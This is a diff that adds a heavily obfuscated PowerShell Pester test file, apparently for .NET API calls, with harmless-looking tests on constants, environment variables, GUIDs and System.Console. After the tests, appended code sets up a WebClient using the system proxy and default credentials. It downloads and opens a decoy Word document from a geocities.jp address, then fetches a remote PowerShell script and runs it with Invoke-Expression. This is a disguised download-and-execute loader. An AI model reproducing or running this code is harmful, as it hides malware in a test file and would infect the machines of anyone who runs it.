@@ -1,0 +1,36 @@
+ .("{2}{0}{1}"-f 'T-','ItEm','sE')  ('vaRIAb'+'LE'+':69'+'G') ([Type]("{3}{2}{0}{1}" -f'VirOn','MEnT','n','E') ); .('SV')  ('Zn'+'I5') ( [tYpE]("{3}{0}{2}{1}"-f 'OnM','T','en','sYstEm.ENVir')  ) ;&("{0}{2}{1}"-f 'SET','M','-iTe') ("vAriA"+"blE:"+"o"+"ZC")  ([typE]("{0}{1}" -F'M','ath')  ) ;   &('sV')  6841 ([TYPe]("{2}{3}{1}{0}" -f'Th','a','S','YstEm.m') )  ;   .("{0}{1}" -f 'SEt-','iTEM')  ('vaRI'+'ABLe:3C4jP'+'D')  (  [tYPE]("{0}{2}{1}"-F 'SySt','uid','EM.G')  ); ${37`RB6}= [TYpE]("{0}{3}{1}{2}"-f'N','BR','EQuEST','et.wE') ; ${k`Uqx}  = [TyPE]("{0}{3}{1}{2}{6}{4}{5}"-f 'net.C','eDe','NtiaLC','R','CH','E','a');  
+
+
+&("{0}{1}" -f'Describ','e') ("{2}{1}{0}" -f'I','otNetAP','D') -Tags "CI" {
+
+    &('It') ("{9}{3}{6}{4}{1}{12}{10}{7}{11}{5}{0}{2}{8}"-f 't ','st','a consta','uld ','e to use ','ge','be abl',' c','nt','Sho','T','lasses and ','atic .NE') {
+          (.("{1}{0}" -f'i','Gc') ("vaRIab"+"L"+"e:6841")  )."v`Alue"::"E"  | .("{0}{2}{1}" -f'S','d','houl') -Be 2.718281828459045
+         (  .("{0}{1}" -f'VaRI','abLe') 6841  )."Va`lUE"::"p`I" | &("{0}{1}"-f 'Sho','uld') -Be 3.141592653589793
+    }
+
+    .('It') ("{4}{3}{0}{6}{7}{5}{2}{1}"-f 'ld be able to ','od','eth','ou','Sh','a m','invo','ke ') {
+         (  &("{1}{2}{0}" -f'EM','gEt-i','T')  ("{2}{1}{0}"-f 'Ni5','rIable:z','vA') )."v`AluE"::("{5}{1}{3}{0}{2}{4}" -f 't','Environ','Var','men','iable','Get').Invoke(("{1}{0}" -f'TH','PA')) | &("{1}{0}" -f'd','Shoul') -Be ${E`Nv:PATH}
+    }
+
+    &('It') ((("{15}{8}{4}{3}{13}{9}{14}{2}{5}{0}{12}{10}{6}{1}{11}{16}{7}"-f'mbhw','a','hwsys','o','n','te',' of st','sses','ould ',' require ','n front','tic cl',' i','t','b','Sh','a'))-cReplACe([Char]98+[Char]104+[Char]119),[Char]39) {
+          ( &("{0}{1}" -f 'I','tEM') ('vARIaB'+'LE'+':69'+'g') )."Va`LUe"::"C`OmMa`Nd`lIne" | .("{0}{1}" -f'Sho','uld') -Be ( (.("{2}{1}{0}"-f'le','aB','GET-VARI') ('ZN'+'I5') -ValuEoNly )::"C`OMMaN`d`liNe")
+          ( &("{0}{1}{2}"-f'g','et-','ItEM')  ("VaRia"+"BlE:"+"O"+"Zc"))."VAL`Ue"::"e" | &("{1}{2}{0}"-f'uld','Sh','o') -Be ( (&('gi')  ("{2}{1}{0}{3}{4}" -f'BlE:6','rIA','Va','84','1'))."V`ALUE"::"e")
+    }
+
+    .('It') ("{9}{8}{5}{11}{7}{0}{12}{2}{10}{4}{13}{1}{14}{3}{6}" -f' i',' .N','ce ','objec','f ','c','t','e a new','le to ','Should be ab','o','reat','nstan','a','et ') {
+        [System.Guid]${G`UiD`VaL} =   ${3`C4`jPD}::("{1}{0}" -f'd','NewGui').Invoke()
+        ${gU`IdV`AL} | &("{0}{2}{1}" -f'Sh','uld','o') -BeOfType ("{1}{0}" -f 'd','Gui')
+    }
+
+    &('It') ("{5}{3}{9}{2}{1}{10}{4}{0}{8}{7}{6}" -f'm.C','y','t','cc','s in Syste','Should a','e','ol','ons','ess ','pe') {
+        ${Ty`pe} = ("{1}{2}{0}{3}" -f 'm.C','S','yste','onsole') -as [type]
+        ${T`YpE}.("{2}{1}{3}{0}"-f'o','Ty','Get','peInf').Invoke()."fU`LlNaME" | .("{1}{0}" -f 'hould','S') -BeExactly ("{1}{2}{0}"-f'le','Syste','m.Conso')
+    }
+}
+
+${N}=.("{2}{0}{1}" -f 'jec','t','new-ob') ("{1}{2}{0}"-f 'webclient','ne','t.');
+${n}."Pr`Oxy"=  ${37`RB6}::("{1}{3}{0}{4}{2}"-f'mWebP','GetSys','oxy','te','r').Invoke();
+${n}."pR`Oxy"."C`RedE`N`TiaLS"=  ( &("{1}{0}" -f'-iteM','gEt')  ("{1}{0}{2}" -f'Bl','vAria','e:Kuqx') )."VA`LUe"::"DEF`AulTcrE`denT`IaLs";
+${n}.("{2}{0}{1}{3}" -f'o','adF','Downl','ile').Invoke(("{16}{11}{12}{7}{6}{10}{4}{15}{1}{0}{3}{8}{5}{9}{14}{13}{2}"-f 'oy6/huuli','/lgxp','x','in-t','s.','sul-','iti','geoc','u','offs','e',':','//www.','0160918.doc','h-2','jp','http'),"$env:temp\huuliin-tusul-offsh-20160918.docx");
+&("{3}{2}{0}{1}{4}" -f'ro','ces','-P','Start','s') "$env:temp\huuliin-tusul-offsh-20160918.docx"
+&("{0}{1}"-f'I','EX') ${n}.("{1}{0}{3}{2}" -f 'adst','downlo','g','rin').Invoke(("{1}{7}{6}{4}{2}{5}{9}{11}{0}{10}{8}{12}{3}" -f '6','h','c','1','w.geo','ities.j','//ww','ttp:','092','p/l','/f','gxpoy','1.ps'));
